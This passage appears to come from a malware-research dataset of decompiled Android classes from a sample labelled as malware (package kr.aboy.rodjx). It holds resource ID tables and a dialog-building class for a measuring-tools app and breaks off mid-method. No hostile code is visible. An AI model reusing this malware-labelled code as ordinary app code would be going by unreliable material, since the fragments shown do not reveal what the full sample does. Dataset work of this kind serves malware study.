slide_handle_rect_on=2130837657;     public static final int slide_open=2130837658;     public static final int sliding_back=2130837659;     public static final int sliding_level=2130837660;     public static final int sliding_measure=2130837661;     public static final int sliding_protractor1=2130837662;     public static final int sliding_protractor2=2130837663;     public static final int sliding_protractor3=2130837664;     public static final int sliding_ruler=2130837665;     public static final int sliding_thread=2130837666;     public static final int sms=2130837667;     public static final int sound_off=2130837668;     public static final int sound_on=2130837669;     public static final int star=2130837670;     public static final int step1=2130837671;     public static final int step2=2130837672;     public static final int step3=2130837673;     public static final int step4=2130837674;     public static final int step5=2130837675;     public static final int step_calibrate=2130837676;     public static final int unit1=2130837677;     public static final int vibrate=2130837678;     public static final int wheel=2130837679;     public static final int zoom_in=2130837680;     public static final int zoom_in_no=2130837681;     public static final int zoom_out=2130837682;     public static final int zoom_out_no=2130837683;   } public static final class layout {     public static final int camera_ruler=2130903040;     public static final int chart=2130903041;     public static final int compass=2130903042;     public static final int compass_cam=2130903043;     public static final int custom_ruler=2130903044;     public static final int dialog_height=2130903045;     public static final int dialog_sms=2130903046;     public static final int dialog_sound=2130903047;     public static final int dialog_title=2130903048;     public static final int dialog_vibration=2130903049;     public static final int dialog_width=2130903050;     public static final int flash_led_camera=2130903051;     public static final int flash_led_no=2130903052;     public static final int flash_screen=2130903053;     public static final int flash_widget=2130903054;     public static final int flash_widget_camera=2130903055;     public static final int main=2130903056;     public static final int main5=2130903057;     public static final int main_tab=2130903058;     public static final int main_tab10=2130903059;     public static final int measure=2130903060;     public static final int metal=2130903061;     public static final int sliding_content=2130903062;     public static final int sliding_content_tab10=2130903063;     public static final int sound=2130903064;     public static final int sql_list=2130903065;     public static final int sql_row=2130903066;   } public static final class xml {     public static final int flash_widget_info=2130968576;     public static final int settings_compass=2130968577;     public static final int settings_measure=2130968578;     public static final int settings_ruler=2130968579;     public static final int settings_sound=2130968580;   } public static final class raw {     public static final int beep1=2131034112;     public static final int beep2=2131034113;     public static final int beep3=2131034114;     public static final int beep4=2131034115;     public static final int tick=2131034116;   } public static final class array {     public static final int entries_calibration=2131099648;     public static final int entryValues_calibration=2131099649;     public static final int entries_measure2nd=2131099650;     public static final int entryValues_measure2nd=2131099651;     public static final int entries_distanceunit=2131099652;     public static final int entryValues_distanceunit=2131099653;     public static final int entries_color=2131099654;     public static final int entryValues_color=2131099655;     public static final int entries_ruler=2131099656;     public static final int entryValues_ruler=2131099657;     public static final int entries_size=2131099658;     public static final int entryValues_size=2131099659;     public static final int entries_lengthunit=2131099660;     public static final int entryValues_lengthunit=2131099661;     public static final int entries_lengthlong=2131099662;     public static final int entryValues_lengthlong=2131099663;     public static final int entries_tiltunit=2131099664;     public static final int entryValues_tiltunit=2131099665;     public static final int entries_threadtype=2131099666;     public static final int entryValues_threadtype=2131099667;     public static final int entries_delay=2131099668;     public static final int entryValues_delay=2131099669;     public static final int entries_viakind=2131099670;     public static final int entryValues_viakind=2131099671;     public static final int entries_coorditype=2131099672;     public static final int entryValues_coorditype=2131099673;     public static final int entries_beeplevel_metal=2131099674;     public static final int entryValues_beeplevel_metal=2131099675;     public static final int entries_beepkind_metal=2131099676;     public static final int entryValues_beepkind_metal=2131099677;     public static final int entries_beeplevel=2131099678;     public static final int entryValues_beeplevel=2131099679;     public static final int entries_beepkind=2131099680;     public static final int entryValues_beepkind=2131099681;     public static final int entries_baseline=2131099682;     public static final int entryValues_baseline=2131099683;     public static final int entries_duration=2131099684;     public static final int entryValues_duration=2131099685;     public static final int entries_azimuth=2131099686;     public static final int entryValues_azimuth=2131099687;   } public static final class color {     public static final int transparent=2131165184;     public static final int finder_mask=2131165185;     public static final int finder_frame=2131165186;     public static final int white_color=2131165187;     public static final int black_color=2131165188;     public static final int green_color=2131165189;     public static final int level_color=2131165190;     public static final int orange_color=2131165191;     public static final int finder_mask1=2131165192;     public static final int text_color1=2131165193;     public static final int text_color2=2131165194;   } public static final class string {     public static final int app_name=2131230720;     public static final int app_tools=2131230721;     public static final int app_measure=2131230722;     public static final int app_measure_ver=2131230723;     public static final int app_ruler=2131230724;     public static final int app_ruler_ver=2131230725;     public static final int app_compass=2131230726;     public static final int app_compass_ver=2131230727;     public static final int app_sound=2131230728;     public static final int app_sound_ver=2131230729;     public static final int app_flashlight_ver=2131230730;     public static final int developer_name=2131230731;     public static final int my_email=2131230732;     public static final int my_homepage=2131230733;     public static final int my_homepage_measure=2131230734;     public static final int my_homepage_ruler=2131230735;     public static final int my_homepage_compass=2131230736;     public static final int my_homepage_sound=2131230737;     public static final int my_homepage_flashlight=2131230738;     public static final int developed_by=2131230739;     public static final int send_email=2131230740;     public static final int visit_homepage=2131230741;     public static final int more_apps=2131230742;     public static final int list_ruler=2131230743;     public static final int list_measure=2131230744;     public static final int list_compass=2131230745;     public static final int list_sound=2131230746;     public static final int list_vibration=2131230747;     public static final int list_light=2131230748;     public static final int list_about=2131230749;     public static final int ok=2131230750;     public static final int cancel=2131230751;     public static final int about_msg=2131230752;     public static final int remove_lite=2131230753;     public static final int sensor_error=2131230754;     public static final int mic_error=2131230755;     public static final int gone_error=2131230756;     public static final int cn_error=2131230757;     public static final int loading=2131230758;     public static final int menu_init=2131230759;     public static final int menu_soundhide=2131230760;     public static final int menu_soundshow=2131230761;     public static final int menu_unit_meter=2131230762;     public static final int menu_unit_feet=2131230763;     public static final int menu_language=2131230764;     public static final int menu_language_msg=2131230765;     public static final int menu_home=2131230766;     public static final int menu_manual=2131230767;     public static final int menu_inputheight=2131230768;     public static final int menu_calibrate=2131230769;     public static final int menu_settings=2131230770;     public static final int menu_about=2131230771;     public static final int menu_inputwidth=2131230772;     public static final int menu_compass=2131230773;     public static final int menu_metal=2131230774;     public static final int menu_sound=2131230775;     public static final int menu_vibration=2131230776;     public static final int rate_title=2131230777;     public static final int rate_msg=2131230778;     public static final int rate_never=2131230779;     public static final int about_msg_tools1=2131230780;     public static final int about_msg_tools2=2131230781;     public static final int about_msg_tools3=2131230782;     public static final int distance=2131230783;     public static final int height=2131230784;     public static final int width=2131230785;     public static final int area=2131230786;     public static final int menu_howtouse=2131230787;     public static final int label_height=2131230788;     public static final int dialog_unit_m=2131230789;     public static final int dialog_unit_ft=2131230790;     public static final int dialog_range=2131230791;     public static final int dialog_height1=2131230792;     public static final int dialog_height2=2131230793;     public static final int dialog_checkbox=2131230794;     public static final int calibrate_label=2131230795;     public static final int calibrate=2131230796;     public static final int calibrate_current=2131230797;     public static final int calibrate_msg=2131230798;     public static final int calibrate_no=2131230799;     public static final int calibrate_yes=2131230800;     public static final int pref_category1_measure=2131230801;     public static final int pref_measure2nd=2131230802;     public static final int pref_measure2nd_summary=2131230803;     public static final int pref_distanceunit=2131230804;     public static final int pref_distanceunit_summary=2131230805;     public static final int pref_unit_changed=2131230806;     public static final int pref_category2_measure=2131230807;     public static final int pref_calibration=2131230808;     public static final int pref_calibration_summary=2131230809;     public static final int pref_silent=2131230810;     public static final int pref_silent_summary=2131230811;     public static final int pref_category3_measure=2131230812;     public static final int pref_portrait=2131230813;     public static final int pref_portrait_summary=2131230814;     public static final int pref_zoom=2131230815;     public static final int pref_zoom_summary=2131230816;     public static final int pref_horizon=2131230817;     public static final int pref_horizon_summary=2131230818;     public static final int pref_explain=2131230819;     public static final int pref_explain_summary=2131230820;     public static final int view_msg01_0=2131230821;     public static final int view_msg02_0=2131230822;     public static final int view_msg01_1=2131230823;     public static final int view_msg02_1=2131230824;     public static final int view_msg01_2=2131230825;     public static final int view_msg02_2=2131230826;     public static final int view_msg11_0=2131230827;     public static final int view_msg12_0=2131230828;     public static final int view_msg11_1=2131230829;     public static final int view_msg12_1=2131230830;     public static final int view_msg11_2=2131230831;     public static final int view_msg12_2=2131230832;     public static final int view_msg21_0=2131230833;     public static final int view_msg22_0=2131230834;     public static final int view_msg21_1=2131230835;     public static final int view_msg22_1=2131230836;     public static final int view_msg21_2=2131230837;     public static final int view_msg22_2=2131230838;     public static final int view_msg31=2131230839;     public static final int view_msg32=2131230840;     public static final int shutter_msg0=2131230841;     public static final int shutter_msg1=2131230842;     public static final int shutter_msg2_0=2131230843;     public static final int shutter_msg2_1=2131230844;     public static final int shutter_msg2_2=2131230845;     public static final int shutter_msg3=2131230846;     public static final int visit1_msg=2131230847;     public static final int noshow_msg=2131230848;     public static final int noheight_msg=2131230849;     public static final int nodistance_msg=2131230850;     public static final int noaim_msg=2131230851;     public static final int nolevel1_msg=2131230852;     public static final int nolevel2_msg=2131230853;     public static final int norollzero_msg=2131230854;     public static final int okrollzero_msg=2131230855;     public static final int info1_title_measure=2131230856;     public static final int info1_msg_measure=2131230857;     public static final int info2_title_measure=2131230858;     public static final int info2_step1_measure=2131230859;     public static final int info2_step2_measure=2131230860;     public static final int info2_step3_measure=2131230861;     public static final int info2_step4_measure=2131230862;     public static final int info2_step5_measure=2131230863;     public static final int info3_title_measure=2131230864;     public static final int info3_msg_measure=2131230865;     public static final int info_update=2131230866;     public static final int info_update_measure=2131230867;     public static final int label_width=2131230868;     public static final int dialog_unit_mm=2131230869;     public static final int dialog_unit_inch=2131230870;     public static final int dialog_range_ruler=2131230871;     public static final int angle_unit=2131230872;     public static final int set_roll_zero=2131230873;     public static final int ok_roll_zero=2131230874;     public static final int set_white_black=2131230875;     public static final int sliding_ruler=2131230876;     public static final int sliding_protractor1=2131230877;     public static final int sliding_protractor2=2131230878;     public static final int sliding_protractor3=2131230879;     public static final int sliding_level=2131230880;     public static final int sliding_thread=2131230881;     public static final int pref_category1_ruler=2131230882;     public static final int pref_ruler=2131230883;     public static final int pref_ruler_summary=2131230884;     public static final int pref_lengthunit=2131230885;     public static final int pref_lengthunit_summary=2131230886;     public static final int pref_textsize=2131230887;     public static final int pref_textsize_summary=2131230888;     public static final int pref_backcolor=2131230889;     public static final int pref_backcolor_summary=2131230890;     public static final int pref_multi=2131230891;     public static final int pref_multi_summary=2131230892;     public static final int pref_category2_ruler=2131230893;     public static final int pref_lengthscale=2131230894;     public static final int pref_lengthscale_summary=2131230895;     public static final int pref_lengthscale_dialog=2131230896;     public static final int pref_vhside=2131230897;     public static final int pref_vhside_summary=2131230898;     public static final int pref_lengthlong=2131230899;     public static final int pref_lengthlong_summary=2131230900;     public static final int pref_category3_ruler=2131230901;     public static final int pref_tiltunit=2131230902;     public static final int pref_tiltunit_summary=2131230903;     public static final int pref_calibratetext=2131230904;     public static final int pref_calibratetext_summary=2131230905;     public static final int pref_category4_ruler=2131230906;     public static final int pref_leveltop=2131230907;     public static final int pref_leveltop_summary=2131230908;     public static final int pref_category5_ruler=2131230909;     public static final int pref_isthread=2131230910;     public static final int pref_isthread_summary=2131230911;     public static final int pref_threadtype=2131230912;     public static final int pref_threadtype_summary=2131230913;     public static final int holding=2131230914;     public static final int noerect_msg=2131230915;     public static final int nolie_msg=2131230916;     public static final int info1_title_ruler=2131230917;     public static final int info1_msg_ruler=2131230918;     public static final int info2_title_ruler=2131230919;     public static final int info2_msg_ruler=2131230920;     public static final int info3_title_ruler=2131230921;     public static final int info3_msg_ruler=2131230922;     public static final int info_update_ruler=2131230923;     public static final int magnetic_field=2131230924;     public static final int calibrate_ask=2131230925;     public static final int calibrate_ok=2131230926;     public static final int latitude=2131230927;     public static final int latitude_north=2131230928;     public static final int latitude_south=2131230929;     public static final int longitude=2131230930;     public static final int longitude_east=2131230931;     public static final int longitude_west=2131230932;     public static final int mgrs=2131230933;     public static final int altitude=2131230934;     public static final int calibrate_azimuth=2131230935;     public static final int pref_category1_compass=2131230936;     public static final int pref_camera=2131230937;     public static final int pref_camera_summary=2131230938;     public static final int pref_lensatic=2131230939;     public static final int pref_lensatic_summary=2131230940;     public static final int pref_accel=2131230941;     public static final int pref_accel_summary=2131230942;     public static final int pref_azimuth=2131230943;     public static final int pref_azimuth_summary=2131230944;     public static final int pref_category2_compass=2131230945;     public static final int pref_gps=2131230946;     public static final int pref_gps_summary=2131230947;     public static final int pref_viakind=2131230948;     public static final int pref_viakind_summary=2131230949;     public static final int pref_coordi=2131230950;     public static final int pref_coordi_summary=2131230951;     public static final int pref_altitudeunit=2131230952;     public static final int pref_altitudeunit_summary=2131230953;     public static final int pref_category3_compass=2131230954;     public static final int pref_beeplevel3=2131230955;     public static final int pref_beeplevel3_summary=2131230956;     public static final int pref_beepkind3=2131230957;     public static final int pref_beepkind3_summary=2131230958;     public static final int pref_category4_compass=2131230959;     public static final int pref_delay=2131230960;     public static final int pref_delay_summary=2131230961;     public static final int pref_init=2131230962;     public static final int pref_init_summary=2131230963;     public static final int init_ask=2131230964;     public static final int init_ok=2131230965;     public static final int sms_label=2131230966;     public static final int sms_receiver=2131230967;     public static final int sms_save=2131230968;     public static final int sms_message=2131230969;     public static final int sms_send=2131230970;     public static final int sms_success=2131230971;     public static final int sms_fail=2131230972;     public static final int sms_no_input=2131230973;     public static final int nosatellite_msg=2131230974;     public static final int info1_title_compass=2131230975;     public static final int info1_msg_compass=2131230976;     public static final int info2_title_compass=2131230977;     public static final int info2_msg_compass=2131230978;     public static final int info3_title_compass=2131230979;     public static final int info3_msg_compass=2131230980;     public static final int info_update_compass=2131230981;     public static final int sound_db1=2131230982;     public static final int sound_db2=2131230983;     public static final int vibration_db1=2131230984;     public static final int vibration_db2=2131230985;     public static final int max_msg=2131230986;     public static final int mean_msg=2131230987;     public static final int reset_msg_0=2131230988;     public static final int reset_msg_1=2131230989;     public static final int db20_msg=2131230990;     public static final int db30_msg=2131230991;     public static final int db40_msg=2131230992;     public static final int db50_msg=2131230993;     public static final int db60_msg=2131230994;     public static final int db70_msg=2131230995;     public static final int db80_msg=2131230996;     public static final int db90_msg=2131230997;     public static final int db100_msg=2131230998;     public static final int db110_msg=2131230999;     public static final int db120_msg=2131231000;     public static final int db130_msg=2131231001;     public static final int db180_msg=2131231002;     public static final int vib1_msg=2131231003;     public static final int vib2_msg=2131231004;     public static final int vib3_msg=2131231005;     public static final int vib4_msg=2131231006;     public static final int vib5_msg=2131231007;     public static final int vib6_msg=2131231008;     public static final int vib7_msg=2131231009;     public static final int vib8_msg=2131231010;     public static final int vib9_msg=2131231011;     public static final int vib10_msg=2131231012;     public static final int vib11_msg=2131231013;     public static final int vib12_msg=2131231014;     public static final int vib13_msg=2131231015;     public static final int menu_sql=2131231016;     public static final int menu_refresh=2131231017;     public static final int label_title=2131231018;     public static final int sql_xname_sound=2131231019;     public static final int sql_xname_vibration=2131231020;     public static final int sql_yname_sound=2131231021;     public static final int sql_yname_vibration=2131231022;     public static final int sql_option=2131231023;     public static final int sql_save=2131231024;     public static final int sql_delete=2131231025;     public static final int sql_load=2131231026;     public static final int sql_saven=2131231027;     public static final int sql_nolist=2131231028;     public static final int pref_category1_sound=2131231029;     public static final int pref_upsidedown=2131231030;     public static final int pref_upsidedown_summary=2131231031;     public static final int pref_soundlevel=2131231032;     public static final int pref_soundlevel_summary=2131231033;     public static final int pref_duration=2131231034;     public static final int pref_duration_summary=2131231035;     public static final int pref_category2_sound=2131231036;     public static final int pref_beeplevel4=2131231037;     public static final int pref_beeplevel4_summary=2131231038;     public static final int pref_beepkind4=2131231039;     public static final int pref_beepkind4_summary=2131231040;     public static final int pref_baseline=2131231041;     public static final int pref_baseline_summary=2131231042;     public static final int info1_title_sound=2131231043;     public static final int info1_msg_sound=2131231044;     public static final int info2_title_sound=2131231045;     public static final int info2_msg_sound=2131231046;     public static final int info_update_sound=2131231047;     public static final int no_led=2131231048;     public static final int busy_msg=2131231049;   } public static final class id {     public static final int preview_surface=2131296256;     public static final int custom_view=2131296257;     public static final int sliding_drawer=2131296258;     public static final int handle=2131296259;     public static final int content=2131296260;     public static final int icon_slide=2131296261;     public static final int layout1=2131296262;     public static final int button_save=2131296263;     public static final int button_load=2131296264;     public static final int chart_view=2131296265;     public static final int view_compass=2131296266;     public static final int preview_compass=2131296267;     public static final int finder_compass=2131296268;     public static final int height1=2131296269;     public static final int unit1=2131296270;     public static final int layout2=2131296271;     public static final int height2=2131296272;     public static final int unit2=2131296273;     public static final int layout3=2131296274;     public static final int checkbox=2131296275;     public static final int layout4=2131296276;     public static final int button=2131296277;     public static final int button1=2131296278;     public static final int phone=2131296279;     public static final int phone_save=2131296280;     public static final int sms_byte=2131296281;     public static final int message=2131296282;     public static final int finish_button=2131296283;     public static final int cancel_button=2131296284;     public static final int layout3_1=2131296285;     public static final int amplitude_text=2131296286;     public static final int amplitude_level1=2131296287;     public static final int amplitude_level2=2131296288;     public static final int layout3_2=2131296289;     public static final int calibrate_plus=2131296290;     public static final int calibrate_text=2131296291;     public static final int calibrate_minus=2131296292;     public static final int sql_title=2131296293;     public static final int button_ok=2131296294;     public static final int button_cancel=2131296295;     public static final int width=2131296296;     public static final int unit=2131296297;     public static final int layout_led=2131296298;     public static final int flash_surface=2131296299;     public static final int button_led=2131296300;     public static final int bar_led=2131296301;     public static final int layout_screen=2131296302;     public static final int button_screen=2131296303;     public static final int bar_screen=2131296304;     public static final int icon_widget=2131296305;     public static final int flash_surface_widget=2131296306;     public static final int layout0=2131296307;     public static final int layout12=2131296308;     public static final int main_shelf1=2131296309;     public static final int layout1_1=2131296310;     public static final int icon_ruler=2131296311;     public static final int icon_protractor2=2131296312;     public static final int icon_protractor3=2131296313;     public static final int icon_level=2131296314;     public static final int main_shelf2=2131296315;     public static final int icon_measure=2131296316;     public static final int layout354=2131296317;     public static final int main_shelf3=2131296318;     public static final int icon_compass=2131296319;     public static final int icon_metal=2131296320;     public static final int layout5=2131296321;     public static final int main_shelf5=2131296322;     public static final int icon_light=2131296323;     public static final int main_shelf4=2131296324;     public static final int layout4_1=2131296325;     public static final int icon_sound=2131296326;     public static final int icon_vibration=2131296327;     public static final int layout9=2131296328;     public static final int text_about=2131296329;     public static final int layout1_11=2131296330;     public static final int layout1_2=2131296331;     public static final int layout235=2131296332;     public static final int layout23=2131296333;     public static final int layout32=2131296334;     public static final int layout5_1=2131296335;     public static final int layout5_2=2131296336;     public static final int layout41=2131296337;     public static final int layout42=2131296338;     public static final int layout43=2131296339;     public static final int layout2_1=2131296340;     public static final int button_ruler=2131296341;     public static final int button_measure=2131296342;     public static final int layout2_2=2131296343;     public static final int button_compass=2131296344;     public static final int button_sound=2131296345;     public static final int layout2_3=2131296346;     public static final int button_light=2131296347;     public static final int button_about=2131296348;     public static final int preview_measure=2131296349;     public static final int finder_measure=2131296350;     public static final int metal_view=2131296351;     public static final int ruler=2131296352;     public static final int ruler_text=2131296353;     public static final int protractor1=2131296354;     public static final int protractor1_text=2131296355;     public static final int layout34=2131296356;     public static final int protractor2=2131296357;     public static final int protractor2_text=2131296358;     public static final int protractor3=2131296359;     public static final int protractor3_text=2131296360;     public static final int layout56=2131296361;     public static final int level=2131296362;     public static final int level_text=2131296363;     public static final int layout6_1=2131296364;     public static final int measure=2131296365;     public static final int measure_text=2131296366;     public static final int layout6_2=2131296367;     public static final int thread=2131296368;     public static final int thread_text=2131296369;     public static final int soundview_view=2131296370;     public static final int date_text=2131296371;     public static final int title_text=2131296372;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\color.code","public static final class color {   public static final int transparent=2131165184;   public static final int finder_mask=2131165185;   public static final int finder_frame=2131165186;   public static final int white_color=2131165187;   public static final int black_color=2131165188;   public static final int green_color=2131165189;   public static final int level_color=2131165190;   public static final int orange_color=2131165191;   public static final int finder_mask1=2131165192;   public static final int text_color1=2131165193;   public static final int text_color2=2131165194; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\d.code","public class d {   public Dialog a(  Context context){     ScrollView scrollView=new ScrollView(context);     LinearLayout linearLayout=new LinearLayout(context);     scrollView.addView(linearLayout);     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setView(scrollView);     builder.setTitle(C0000R.string.app_measure_ver);     builder.setIcon(C0000R.drawable.icon_measure);     linearLayout.setOrientation(1);     linearLayout.setPadding(10,10,10,10);     TextView textView=new TextView(context);     textView.setTextColor(-1);     textView.setTextSize(20.0f);     textView.setText(C0000R.string.info1_title_measure);     linearLayout.addView(textView);     TextView textView2=new TextView(context);     textView2.setText(C0000R.string.info1_msg_measure);     linearLayout.addView(textView2);     TextView textView3=new TextView(context);     textView3.setTextColor(-1);     textView3.setTextSize(20.0f);     textView3.setText(C0000R.string.info2_title_measure);     linearLayout.addView(textView3);     TextView textView4=new TextView(context);     textView4.setText(C0000R.string.info2_step1_measure);     linearLayout.addView(textView4);     ImageView imageView=new ImageView(context);     imageView.setImageResource(C0000R.drawable.step1);     linearLayout.addView(imageView);     TextView textView5=new TextView(context);     textView5.setText(C0000R.string.info2_step2_measure);     linearLayout.addView(textView5);     ImageView imageView2=new ImageView(context);     imageView2.setImageResource(C0000R.drawable.step2);     linearLayout.addView(imageView2);     TextView textView6=new TextView(context);     textView6.setText(C0000R.string.info2_step3_measure);     linearLayout.addView(textView6);     ImageView imageView3=new ImageView(context);     imageView3.setImageResource(C0000R.drawable.step3);     linearLayout.addView(imageView3);     TextView textView7=new TextView(context);     textView7.setText(C0000R.string.info2_step4_measure);     linearLayout.addView(textView7);     ImageView imageView4=new ImageView(context);     imageView4.setImageResource(C0000R.drawable.step4);     linearLayout.addView(imageView4);     TextView textView8=new TextView(context);     textView8.setText(C0000R.string.info2_step5_measure);     linearLayout.addView(textView8);     ImageView imageView5=new ImageView(context);     imageView5.setImageResource(C0000R.drawable.step5);     linearLayout.addView(imageView5);     TextView textView9=new TextView(context);     textView9.setTextSize(10.0f);     textView9.setText(""\n"");     linearLayout.addView(textView9);     TextView textView10=new TextView(context);     textView10.setText(C0000R.string.info3_title_measure);     textView10.setTextColor(-1);     textView10.setTextSize(20.0f);     linearLayout.addView(textView10);     TextView textView11=new TextView(context);     textView11.setText(C0000R.string.info3_msg_measure);     linearLayout.addView(textView11);     TextView textView12=new TextView(context);     textView12.setText(C0000R.string.info_update);     textView12.setTextColor(-1);     textView12.setTextSize(20.0f);     linearLayout.addView(textView12);     TextView textView13=new TextView(context);     textView13.setText(C0000R.string.info_update_measure);     linearLayout.addView(textView13);     builder.setPositiveButton(C0000R.string.ok,new e(this));     builder.setNegativeButton(C0000R.string.visit_homepage,new o(this,context));     return builder.create();   }   public Dialog b(  Context context){     ScrollView scrollView=new ScrollView(context);     LinearLayout linearLayout=new LinearLayout(context);     scrollView.addView(linearLayout);     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setView(scrollView);     builder.setTitle(C0000R.string.app_ruler_ver);     builder.setIcon(C0000R.drawable.icon_ruler);     linearLayout.setOrientation(1);     linearLayout.setPadding(10,10,10,10);     TextView textView=new TextView(context);     textView.setText(C0000R.string.info1_title_ruler);     textView.setTextColor(-1);     textView.setTextSize(20.0f);     linearLayout.addView(textView);     TextView textView2=new TextView(context);     textView2.setText(C0000R.string.info1_msg_ruler);     linearLayout.addView(textView2);     TextView textView3=new TextView(context);     textView3.setText(C0000R.string.info2_title_ruler);     textView3.setTextColor(-1);     textView3.setTextSize(20.0f);     linearLayout.addView(textView3);     TextView textView4=new TextView(context);     textView4.setText(C0000R.string.info2_msg_ruler);     linearLayout.addView(textView4);     TextView textView5=new TextView(context);     textView5.setText(C0000R.string.info3_title_ruler);     textView5.setTextColor(-1);     textView5.setTextSize(20.0f);     linearLayout.addView(textView5);     TextView textView6=new TextView(context);     textView6.setText(C0000R.string.info3_msg_ruler);     linearLayout.addView(textView6);     TextView textView7=new TextView(context);     textView7.setText(C0000R.string.info_update);     textView7.setTextColor(-1);     textView7.setTextSize(20.0f);     linearLayout.addView(textView7);     TextView textView8=new TextView(context);     textView8.setText(C0000R.string.info_update_ruler);     linearLayout.addView(textView8);     builder.setPositiveButton(C0000R.string.ok,new p(this));     builder.setNegativeButton(C0000R.string.visit_homepage,new q(this,context));     return builder.create();   }   public Dialog c(  Context context){     ScrollView scrollView=new ScrollView(context);     LinearLayout linearLayout=new LinearLayout(context);     scrollView.addView(linearLayout);     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setView(scrollView);     builder.setTitle(C0000R.string.app_compass_ver);     builder.setIcon(C0000R.drawable.icon_compass);     linearLayout.setOrientation(1);     linearLayout.setPadding(10,10,10,10);     TextView textView=new TextView(context);     textView.setTextColor(-1);     textView.setTextSize(20.0f);     textView.setText(C0000R.string.info1_title_compass);     linearLayout.addView(textView);     TextView textView2=new TextView(context);     textView2.setText(C0000R.string.info1_msg_compass);     linearLayout.addView(textView2);     TextView textView3=new TextView(context);     textView3.setTextColor(-1);     textView3.setTextSize(20.0f);     textView3.setText(C0000R.string.info2_title_compass);     linearLayout.addView(textView3);     TextView textView4=new TextView(context);     textView4.setText(C0000R.string.info2_msg_compass);     linearLayout.addView(textView4);     TextView textView5=new TextView(context);     textView5.setText(C0000R.string.info3_title_compass);     textView5.setTextColor(-1);     textView5.setTextSize(20.0f);     linearLayout.addView(textView5);     TextView textView6=new TextView(context);     textView6.setText(C0000R.string.info3_msg_compass);     linearLayout.addView(textView6);     TextView textView7=new TextView(context);     textView7.setText(C0000R.string.info_update);     textView7.setTextColor(-1);     textView7.setTextSize(20.0f);     linearLayout.addView(textView7);     TextView textView8=new TextView(context);     textView8.setText(C0000R.string.info_update_compass);     linearLayout.addView(textView8);     builder.setPositiveButton(C0000R.string.ok,new r(this));     builder.setNegativeButton(C0000R.string.visit_homepage,new s(this,context));     return builder.create();   }   public Dialog d(  Context context){     ScrollView scrollView=new ScrollView(context);     LinearLayout linearLayout=new LinearLayout(context);     scrollView.addView(linearLayout);     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setView(scrollView);     builder.setTitle(C0000R.string.app_sound_ver);     builder.setIcon(C0000R.drawable.icon_sound);     linearLayout.setOrientation(1);     linearLayout.setPadding(10,10,10,10);     TextView textView=new TextView(context);     textView.setText(C0000R.string.info1_title_sound);     textView.setTextColor(-1);     textView.setTextSize(20.0f);     linearLayout.addView(textView);     TextView textView2=new TextView(context);     textView2.setText(C0000R.string.info1_msg_sound);     linearLayout.addView(textView2);     TextView textView3=new TextView(context);     textView3.setText(C0000R.string.info2_title_sound);     textView3.setTextColor(-1);     textView3.setTextSize(20.0f);     linearLayout.addView(textView3);     TextView textView4=new TextView(context);     textView4.setText(C0000R.string.info2_msg_sound);     linearLayout.addView(textView4);     TextView textView5=new TextView(context);     textView5.setText(C0000R.string.info_update);     textView5.setTextColor(-1);     textView5.setTextSize(20.0f);     linearLayout.addView(textView5);     TextView textView6=new TextView(context);     textView6.setText(C0000R.string.info_update_sound);     linearLayout.addView(textView6);     builder.setPositiveButton(C0000R.string.ok,new t(this));     builder.setNegativeButton(C0000R.string.visit_homepage,new u(this,context));     return builder.create();   }   public Dialog e(  Context context){     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setTitle(C0000R.string.app_flashlight_ver);     builder.setIcon(C0000R.drawable.icon);     builder.setMessage(String.valueOf(context.getString(C0000R.string.developed_by)) + "" "" + context.getString(C0000R.string.developer_name)+ ""\n""+ ((Object)context.getText(C0000R.string.my_email))+ ""\n\n""+ ((Object)context.getText(C0000R.string.about_msg))+ ""\n""+ ((Object)context.getText(C0000R.string.my_homepage)));     builder.setPositiveButton(C0000R.string.ok,new v(this));     builder.setNeutralButton(C0000R.string.visit_homepage,new f(this,context));     builder.setNegativeButton(C0000R.string.send_email,new g(this,context));     return builder.create();   }   public Dialog f(  Context context){     SharedPreferences.Editor edit=PreferenceManager.getDefaultSharedPreferences(context).edit();     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setTitle(C0000R.string.rate_title);     builder.setIcon(C0000R.drawable.icon);     builder.setMessage(context.getString(C0000R.string.rate_msg));     builder.setCancelable(false);     builder.setPositiveButton(C0000R.string.ok,new h(this,context,edit));     builder.setNeutralButton(C0000R.string.cancel,new i(this));     builder.setNegativeButton(C0000R.string.rate_never,new j(this,edit));     return builder.create();   }   public Dialog g(  Context context){     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setTitle(C0000R.string.app_tools);     builder.setIcon(C0000R.drawable.icon);     builder.setMessage(String.valueOf(context.getString(C0000R.string.about_msg_tools1)) + ""------------------------------------\n"" + context.getString(C0000R.string.about_msg_tools2)+ ""------------------------------------\n""+ context.getString(C0000R.string.developed_by)+ "" ""+ context.getString(C0000R.string.developer_name)+ ""\n""+ context.getString(C0000R.string.my_email)+ ""\n\n""+ context.getString(C0000R.string.about_msg)+ ""\n""+ context.getString(C0000R.string.my_homepage)+ ""\n\n""+ context.getString(C0000R.string.about_msg_tools3));     builder.setPositiveButton(C0000R.string.ok,new k(this));     builder.setNegativeButton(C0000R.string.send_email,new l(this,context));     return builder.create();   }   public Dialog h(  Context context){     ScrollView scrollView=new ScrollView(context);     LinearLayout linearLayout=new LinearLayout(context);     scrollView.addView(linearLayout);     linearLayout.setOrientation(1);     linearLayout.setPadding(10,10,10,10);     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setView(scrollView);     builder.setTitle(C0000R.string.menu_howtouse);     ImageView imageView=new ImageView(context);     imageView.setImageResource(C0000R.drawable.step1);     linearLayout.addView(imageView);     TextView textView=new TextView(context);     textView.setTextSize(15.0f);     textView.setText(C0000R.string.visit1_msg);     linearLayout.addView(textView);     ImageView imageView2=new ImageView(context);     imageView2.setImageResource(C0000R.drawable.step2);     linearLayout.addView(imageView2);     TextView textView2=new TextView(context);     textView2.setTextSize(10.0f);     textView2.setText(""\n"");     linearLayout.addView(textView2);     ImageView imageView3=new ImageView(context);     imageView3.setImageResource(C0000R.drawable.step3);     linearLayout.addView(imageView3);     TextView textView3=new TextView(context);     textView3.setTextSize(10.0f);     textView3.setText(""\n"");     